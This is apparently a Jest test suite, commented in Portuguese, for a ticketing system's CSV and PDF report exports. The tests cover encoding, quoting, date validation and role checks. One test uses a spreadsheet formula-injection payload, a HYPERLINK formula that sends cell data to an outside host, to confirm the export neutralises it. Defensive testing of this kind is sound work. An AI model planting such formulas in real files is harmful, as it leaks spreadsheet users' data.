const request = require('supertest');
const app = require('../src/app');
const pool = require('../src/config/db');
const { campo, COLUNAS } = require('../src/services/exportacao.service');

const { ipDaSuite } = require('./apoio/ip');

// Ver tests/apoio/ip.js: cada suíte se apresenta ao login como um cliente
// distinto, para não dividir a cota por IP com as suítes que rodam em paralelo.
const IP = ipDaSuite(__filename);

let gestor;
let solicitante;
let tecnico;
let localId;
let categoriaId;
const marca = Date.now();

async function criarUsuarioELogar(perfil) {
  const email = `${perfil}_exp_${Date.now()}_${Math.random().toString(36).slice(2)}@exemplo.com`;
  await request(app).post('/auth/registrar').send({ nome: `Exp ${perfil}`, email, senha: 'senha123' });
  if (perfil !== 'solicitante') {
    await pool.query('UPDATE usuario SET perfil = $1 WHERE email = $2', [perfil, email]);
  }
  const login = await request(app)
    .post('/auth/login')
    .set('X-Real-IP', IP)
    .send({ email, senha: 'senha123' });
  return { token: login.body.token, usuario: login.body.usuario };
}

const auth = (quem) => ({ Authorization: `Bearer ${quem.token}` });

async function abrir(titulo = 'Chamado para exportar') {
  const resp = await request(app).post('/chamados').set(auth(solicitante)).send({
    titulo,
    descricao: 'Descrição do problema relatado',
    categoria_id: categoriaId,
    local_id: localId,
  });
  return resp.body.chamado;
}

/** Divide uma linha de CSV respeitando as aspas. */
function separar(linha) {
  const campos = [];
  let atual = '';
  let dentroDeAspas = false;

  for (let i = 0; i < linha.length; i += 1) {
    const c = linha[i];
    if (c === '"') {
      if (dentroDeAspas && linha[i + 1] === '"') {
        atual += '"';
        i += 1;
      } else {
        dentroDeAspas = !dentroDeAspas;
      }
    } else if (c === ';' && !dentroDeAspas) {
      campos.push(atual);
      atual = '';
    } else {
      atual += c;
    }
  }
  campos.push(atual);
  return campos;
}

function linhasDe(texto) {
  return texto.replace(/^﻿/, '').split('\r\n').filter(Boolean);
}

beforeAll(async () => {
  gestor = await criarUsuarioELogar('gestor');
  solicitante = await criarUsuarioELogar('solicitante');
  tecnico = await criarUsuarioELogar('tecnico');

  const local = await pool.query(
    "INSERT INTO local (unidade, bloco) VALUES ($1, 'E') RETURNING id",
    [`Unidade Exp ${marca}`]
  );
  const categoria = await pool.query('SELECT id FROM categoria LIMIT 1');
  localId = local.rows[0].id;
  categoriaId = categoria.rows[0].id;
});

afterAll(async () => {
  await pool.end();
});

describe('Planilha analítica (RF10)', () => {
  it('devolve CSV com cabeçalho de download e BOM', async () => {
    await abrir();

    const resp = await request(app)
      .get('/relatorios/exportar/chamados.csv')
      .set(auth(gestor))
      .buffer()
      .parse((res, callback) => {
        const pedacos = [];
        res.on('data', (p) => pedacos.push(p));
        res.on('end', () => callback(null, Buffer.concat(pedacos)));
      });

    expect(resp.status).toBe(200);
    expect(resp.headers['content-type']).toMatch(/text\/csv/);
    expect(resp.headers['content-disposition']).toMatch(/attachment; filename="chamados.csv"/);

    // Sem o BOM o Excel abre o arquivo como Latin-1 e "manutenção" chega
    // corrompido na máquina de quem recebe.
    expect(resp.body.slice(0, 3)).toEqual(Buffer.from([0xef, 0xbb, 0xbf]));
  });

  it('toda linha tem exatamente as colunas do cabeçalho', async () => {
    await abrir('Chamado com ; ponto e vírgula e "aspas" no título');

    const resp = await request(app).get('/relatorios/exportar/chamados.csv').set(auth(gestor));
    const linhas = linhasDe(resp.text);

    expect(linhas.length).toBeGreaterThan(1);
    const larguras = new Set(linhas.map((l) => separar(l).length));
    // Uma única largura: se o escape falhasse num título com ";" dentro, a
    // linha ganharia colunas e a planilha inteira sairia deslocada.
    expect([...larguras]).toEqual([COLUNAS.length]);
  });

  it('preserva o título com aspas e ponto e vírgula', async () => {
    const titulo = 'Porta "emperrada"; não fecha';
    const chamado = await abrir(titulo);

    const resp = await request(app).get('/relatorios/exportar/chamados.csv').set(auth(gestor));
    const linha = linhasDe(resp.text).find((l) => l.startsWith(chamado.protocolo));

    expect(separar(linha)[1]).toBe(titulo);
  });

  it('neutraliza título que o Excel leria como fórmula', async () => {
    const chamado = await abrir('=HYPERLINK("http://fora/"&A1,"clique")');

    const resp = await request(app).get('/relatorios/exportar/chamados.csv').set(auth(gestor));
    const linha = linhasDe(resp.text).find((l) => l.startsWith(chamado.protocolo));
    const titulo = separar(linha)[1];

    // O apóstrofo à frente força a célula a ser texto. Sem ele, abrir a
    // planilha dispararia a fórmula escrita por quem abriu o chamado.
    expect(titulo.startsWith("'=")).toBe(true);
  });

  it('período sem chamados devolve planilha só com o cabeçalho', async () => {
    const resp = await request(app)
      .get('/relatorios/exportar/chamados.csv?de=2099-01-01')
      .set(auth(gestor));

    const linhas = linhasDe(resp.text);
    expect(linhas).toHaveLength(1);
    expect(separar(linhas[0])).toHaveLength(COLUNAS.length);
  });

  it('recusa data malformada como erro JSON, não como arquivo', async () => {
    const resp = await request(app)
      .get('/relatorios/exportar/chamados.csv?de=ontem')
      .set(auth(gestor));

    expect(resp.status).toBe(422);
    expect(resp.headers['content-type']).toMatch(/json/);
    // O download não pode ter começado: um 422 depois do primeiro byte
    // chegaria dentro do arquivo salvo, não na tela.
    expect(resp.headers['content-disposition']).toBeUndefined();
  });

  it('o nome do arquivo carrega o período exportado', async () => {
    const resp = await request(app)
      .get('/relatorios/exportar/chamados.csv?de=2026-01-01&ate=2026-12-31')
      .set(auth(gestor));

    expect(resp.headers['content-disposition']).toContain(
      'filename="chamados_2026-01-01_a_2026-12-31.csv"'
    );
  });

  it('traz os dados do chamado nas colunas certas', async () => {
    const chamado = await abrir('Chamado que será concluído');
    await request(app).patch(`/chamados/${chamado.id}/estado`).set(auth(gestor)).send({ estado: 'em_triagem' });
    await request(app)
      .patch(`/chamados/${chamado.id}/atribuir`)
      .set(auth(gestor))
      .send({ tecnico_id: tecnico.usuario.id });
    await request(app).patch(`/chamados/${chamado.id}/estado`).set(auth(gestor)).send({ estado: 'em_andamento' });
    await request(app)
      .patch(`/chamados/${chamado.id}/estado`)
      .set(auth(gestor))
      .send({ estado: 'concluido', servico_realizado: 'Troca da fechadura e ajuste do batente.' });

    const resp = await request(app).get('/relatorios/exportar/chamados.csv').set(auth(gestor));
    const valores = separar(linhasDe(resp.text).find((l) => l.startsWith(chamado.protocolo)));
    const em = (rotulo) => valores[COLUNAS.findIndex((c) => c.rotulo === rotulo)];

    expect(em('Estado')).toBe('Concluído');
    expect(em('Local')).toBe(`Unidade Exp ${marca} / E`);
    expect(em('Técnico')).toBe(tecnico.usuario.nome);
    expect(em('Concluído no prazo')).toBe('Sim');
    expect(em('Em atraso agora')).toBe('Não');
    // Data no formato que o Excel em português reconhece sozinho.
    expect(em('Abertura')).toMatch(/^\d{2}\/\d{2}\/\d{4} \d{2}:\d{2}$/);
    // Decimal com vírgula, senão a coluna chega como texto e não soma.
    expect(em('Tempo líquido (h)')).toMatch(/^\d+,\d{2}$/);
  });

  it('solicitante e técnico não exportam', async () => {
    for (const quem of [solicitante, tecnico]) {
      const resp = await request(app).get('/relatorios/exportar/chamados.csv').set(auth(quem));
      expect(resp.status).toBe(403);
    }
  });
});

describe('Escape de CSV (função pura)', () => {
  it.each([
    ['=cmd', "'=cmd"],
    ['+1', "'+1"],
    ['-1', "'-1"],
    ['@sum', "'@sum"],
    ['texto normal', 'texto normal'],
  ])('neutraliza %s', (entrada, esperado) => {
    expect(campo(entrada)).toBe(esperado);
  });

  it('não neutraliza o que o próprio sistema formatou', () => {
    // Um tempo negativo é um dado legítimo; virar texto o tiraria das contas.
    expect(campo('-1,50', { confiavel: true })).toBe('-1,50');
  });

  it('envolve em aspas só quando precisa', () => {
    expect(campo('sem nada')).toBe('sem nada');
    expect(campo('com;separador')).toBe('"com;separador"');
    expect(campo('com "aspas"')).toBe('"com ""aspas"""');
    expect(campo('com\nquebra')).toBe('"com\nquebra"');
  });

  it('vazio e nulo viram campo vazio, não "null"', () => {
    expect(campo(null)).toBe('');
    expect(campo(undefined)).toBe('');
  });
});

describe('Relatório em PDF (RF10)', () => {
  it('devolve um PDF válido com cabeçalho de download', async () => {
    await abrir();

    const resp = await request(app)
      .get('/relatorios/exportar/resumo.pdf')
      .set(auth(gestor))
      .buffer()
      .parse((res, callback) => {
        const pedacos = [];
        res.on('data', (p) => pedacos.push(p));
        res.on('end', () => callback(null, Buffer.concat(pedacos)));
      });

    expect(resp.status).toBe(200);
    expect(resp.headers['content-type']).toBe('application/pdf');
    expect(resp.headers['content-disposition']).toMatch(/attachment; filename="relatorio\.pdf"/);
    expect(resp.body.slice(0, 5).toString()).toBe('%PDF-');
    expect(resp.body.length).toBeGreaterThan(1000);
  });

  it('não gera páginas em branco no fim', async () => {
    const resp = await request(app)
      .get('/relatorios/exportar/resumo.pdf')
      .set(auth(gestor))
      .buffer()
      .parse((res, callback) => {
        const pedacos = [];
        res.on('data', (p) => pedacos.push(p));
        res.on('end', () => callback(null, Buffer.concat(pedacos)));
      });

    const conteudo = resp.body.toString('latin1');
    const paginas = (conteudo.match(/\/Type\s*\/Page[^s]/g) || []).length;
    const ultimoRodape = /Página (\d+) de (\d+)/g;
    let total = null;
    let match;
    while ((match = ultimoRodape.exec(conteudo)) !== null) total = Number(match[2]);

    // O rodapé escrito abaixo da margem fazia o pdfkit criar uma página nova
    // por rodapé: o documento saía com o dobro de páginas, metade vazias.
    expect(paginas).toBeGreaterThan(0);
    if (total !== null) expect(paginas).toBe(total);
  });

  it('solicitante não baixa o relatório', async () => {
    const resp = await request(app).get('/relatorios/exportar/resumo.pdf').set(auth(solicitante));
    expect(resp.status).toBe(403);
  });

  it('recusa data malformada antes de começar o arquivo', async () => {
    const resp = await request(app)
      .get('/relatorios/exportar/resumo.pdf?ate=31/12/2026')
      .set(auth(gestor));

    expect(resp.status).toBe(422);
    expect(resp.headers['content-disposition']).toBeUndefined();
  });
});
